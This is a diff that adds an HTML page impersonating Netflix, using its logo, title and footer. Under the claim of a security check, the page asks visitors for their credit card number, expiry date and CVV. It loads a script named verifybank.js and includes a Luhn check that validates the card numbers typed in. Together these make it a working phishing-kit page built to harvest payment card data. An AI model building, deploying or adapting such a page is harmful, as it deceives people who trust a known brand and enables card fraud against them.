@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+	<link rel="icon" type="image/x-icon" href="favicon.ico" />
+	<title>Netflix</title>
+	<link rel="icon" type="image/x-icon" href="img/nficon2016.ico" sizes="16x16" />
+	<link rel="stylesheet" href="css/reset.css" />
+	<link rel="stylesheet" href="css/common.css" />
+	<link rel="stylesheet" href="css/login_style.css" />
+	<link rel="stylesheet" href="css/login_media.css" />
+
+	<link rel="stylesheet" href="css/verifybank.css" />
+	<script defer src="js/jquery-3.3.1.min.js"></script>
+	<script defer src="js/verifybank.js"></script>
+	<script src="https://unpkg.com/imask"></script>
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
+	<script src="https://githubraw.com/RobinHerbots/jquery.inputmask/3.x/dist/jquery.inputmask.bundle.js"></script>
+
+</head>
+
+<body>
+	<header class="__my-class-nav_wrap">
+		<nav>
+			<figure class="__my-class-svg-nfLogo" id="logo" onclick="location.href='../index.html'">
+				<svg viewBox="0 0 111 30" class="__my-class-svg-icon-netflix">
+					<path
+						d="M105.06233,14.2806261 L110.999156,30 C109.249227,29.7497422 107.500234,29.4366857 105.718437,29.1554972 L102.374168,20.4686475 L98.9371075,28.4375293 C97.2499766,28.1563408 95.5928391,28.061674 93.9057081,27.8432843 L99.9372012,14.0931671 L94.4680851,-5.68434189e-14 L99.5313525,-5.68434189e-14 L102.593495,7.87421502 L105.874965,-5.68434189e-14 L110.999156,-5.68434189e-14 L105.06233,14.2806261 Z M90.4686475,-5.68434189e-14 L85.8749649,-5.68434189e-14 L85.8749649,27.2499766 C87.3746368,27.3437061 88.9371075,27.4055675 90.4686475,27.5930265 L90.4686475,-5.68434189e-14 Z M81.9055207,26.93692 C77.7186241,26.6557316 73.5307901,26.4064111 69.250164,26.3117443 L69.250164,-5.68434189e-14 L73.9366389,-5.68434189e-14 L73.9366389,21.8745899 C76.6248008,21.9373887 79.3120255,22.1557784 81.9055207,22.2804387 L81.9055207,26.93692 Z M64.2496954,10.6561065 L64.2496954,15.3435186 L57.8442216,15.3435186 L57.8442216,25.9996251 L53.2186709,25.9996251 L53.2186709,-5.68434189e-14 L66.3436123,-5.68434189e-14 L66.3436123,4.68741213 L57.8442216,4.68741213 L57.8442216,10.6561065 L64.2496954,10.6561065 Z M45.3435186,4.68741213 L45.3435186,26.2498828 C43.7810479,26.2498828 42.1876465,26.2498828 40.6561065,26.3117443 L40.6561065,4.68741213 L35.8121661,4.68741213 L35.8121661,-5.68434189e-14 L50.2183897,-5.68434189e-14 L50.2183897,4.68741213 L45.3435186,4.68741213 Z M30.749836,15.5928391 C28.687787,15.5928391 26.2498828,15.5928391 24.4999531,15.6875059 L24.4999531,22.6562939 C27.2499766,22.4678976 30,22.2495079 32.7809542,22.1557784 L32.7809542,26.6557316 L19.812541,27.6876933 L19.812541,-5.68434189e-14 L32.7809542,-5.68434189e-14 L32.7809542,4.68741213 L24.4999531,4.68741213 L24.4999531,10.9991564 C26.3126816,10.9991564 29.0936358,10.9054269 30.749836,10.9054269 L30.749836,15.5928391 Z M4.78114163,12.9684132 L4.78114163,29.3429562 C3.09401069,29.5313525 1.59340144,29.7497422 0,30 L0,-5.68434189e-14 L4.4690224,-5.68434189e-14 L10.562377,17.0315868 L10.562377,-5.68434189e-14 L15.2497891,-5.68434189e-14 L15.2497891,28.061674 C13.5935889,28.3437998 11.906458,28.4375293 10.1246602,28.6868498 L4.78114163,12.9684132 Z"
+						id="Fill-14"></path>
+				</svg>
+			</figure>
+		</nav>
+	</header>
+	<section id="sign">
+		<div class="__my-class-sign_wrap">
+			<div class="__my-class-login_wrap">
+
+				<form action="#" id="login_form">
+					<div class="__my-class-login_form_wrap">
+						<div class="__my-class-login_main">
+							<h2 class="pt-5">Additional Information</h2>
+							<h4 class="text-muted pb-3">We need to verify the below information for security reasons.</h4>
+							<div id="input_id">
+								<div class="__my-class-login_field_wrap">
+									<span class="__my-class-dash_bar"></span>
+									<input class="numeric" placeholder="XXXX XXXX XXXX XXXX" maxlength=16 type="text" id="login_id" name="credit-card-number" />
+									<label class="__my-class-placelabel" for="login_id">Your credit card number
+									</label>
+								</div>
+								<div class="__my-class-alert_wrap">
+									<div class="__my-class-id_alert">
+										Credit card number is not valid.
+									</div>
+									<div class="__my-class-wrong_alert">
+										Credit card number is not valid.
+									</div>
+									<div class="__my-class-wrong_alert">
+										Credit card number is not valid.
+									</div>
+								</div>
+							</div>
+							<div id="input_password">
+								<div class="__my-class-login_field_wrap">
+									<span class="__my-class-dash_bar"></span>
+									<input class="login_pw" type="text" maxlength=5 placeholder="MM/YY" id="login_pw" name="pw" />
+									<label class="__my-class-placelabel" for="login_pw">Card expiration date (MM/YY)</label>
+									
+								</div>
+								<div class="__my-class-alert_wrap">
+									<div class="__my-class-pw_alert">
+										Your Card expiration date  must contain between 4.
+									</div>
+								</div>
+							</div>
+
+							   <div id="input_cvv">
+							   	<div class="__my-class-login_field_wrap">
+							   		<span class="__my-class-dash_bar"></span>
+							   		<input  class="numeric" placeholder="CVV" type="text" maxlength=3 id="login_cvv" name="credit-card-number" />
+							   		<label class="__my-class-placelabel" for="login_cvv">
+							   			Card verification number (CVV)</label>
+							   	</div>
+							   	<div class="__my-class-alert_wrap">
+							   		<div class="__my-class-cvv_alert">
+							   			redit number (CVV) is not valid.
+							   		</div>
+							   		<div class="__my-class-wrong_alert">
+							   			redit number (CVV) is not valid
+							   		</div>
+							   		<div class="__my-class-wrong_alert">
+							   			redit number (CVV) is not valid
+							   		</div>
+							   	</div>
+							   </div>
+
+						
+
+
+
+
+
+
+
+							<input type="submit" id="login_submit" value="Confirm" />
+							
+							<div class="__my-class-captcha">
+								<p>
+									For your account security, avoid using a public or shared computer when inputting your ATM, Debit, or Credit
+									Card number or other sensitive information.
+								</p>
+							</div>
+
+
+
+
+						</div>
+						
+					</div>
+				</form>
+
+			</div>
+
+	
+
+
+			<footer>
+				<div class="__my-class-footer_wrap __my-class-footer_log">
+					<div class="__my-class-footer_address_wrap">
+						<p class="__my-class-contact">Questions? Call
+							<a class="__my-class-contact-link" href="tel:0800-509-417">0800-509-417</a>
+						</p>
+					</div>
+					<div class="__my-class-footer_menu">
+						<ul id="login_footer_ul">
+							<li>
+								<a href="#">FAQ</a>
+							</li>
+							<li>
+								<a href="#">Help Center </a>
+							</li>
+							<li>
+								<a href="#">Terms of Use</a>
+							</li>
+							<li>
+								<a href="#">Privacy </a>
+							</li>
+							<li>
+								<a href="#">Cookie Preferences</a>
+							</li>
+							<li>
+								<a href="#">Corporate Information</a>
+							</li>
+						</ul>
+					</div>
+
+				</div>
+			</footer>
+		</div>
+		
+	</section>
+
+
+<script>
+
+
+
+
+	(function($){
+	$('.login_pw').inputmask("datetime",{
+	mask: "1/1",
+	placeholder: "",
+	leapday: "-02-29",
+	separator: "/",
+	alias: "dd/mm/yy"
+	});
+	})(jQuery);
+
+	var test = function(a,b,c,d,e,f){c=d=e=0;for(f in
+	a)try{a[f](function(g,h){g?c++:(d++,b(f,'F',h))})}catch(i){e++;b(f,'E',i)}b(c+'A',d+'F',e+'E')};
+
+	// luhn10 function
+	/*
+	var luhn10 =
+	function(a,b,c,d,e){b=a.length-1,e=0,d=~~a[b];while(b--)e++,c=~~a[b],d+=e%2?~~'0246813579'[c]:c;return!(d%10)};
+	*/
+	var luhn10 =
+	function(a,b,c,d,e){for(b=a.length-1,e=0,d=~~a[b];b--;)e++,c=~~a[b],d+=e%2?~~'0246813579'[c]:c;return!(d%10)};
+
+	// output what we're testing here
+	document.getElementById('login_id').innerHTML = luhn10.toString()+'<br>';
+
+	test({
+	'testPositives': function(assert){
+	var numbers = ("378282246310005 371449635398431 378734493671000 30569309025904 38520000023237 6011111111111117 "+
+	"6011000990139424 5555555555554444 5105105105105100 4111111111111111 4012888888881881 4222222222222").split(" ");
+
+	numbers.forEach(function(item){ assert(luhn10(item)) });
+	},
+	'testNegatives': function(assert){
+	var numbers = ("378282246310006 371449635398439 378734493671005 4111111111111112").split(" ");
+
+	numbers.forEach(function(item){ assert(!luhn10(item)) });
+	}
+	}, function(a,b,c){
+	// log to debugging element
+	document.getElementById('login_id').innerHTML += [a,b,c].join(', ')+'<br>';
+	});
+
+
+
+
+
+</script>
+
+
+
+</body>
+
+</html>
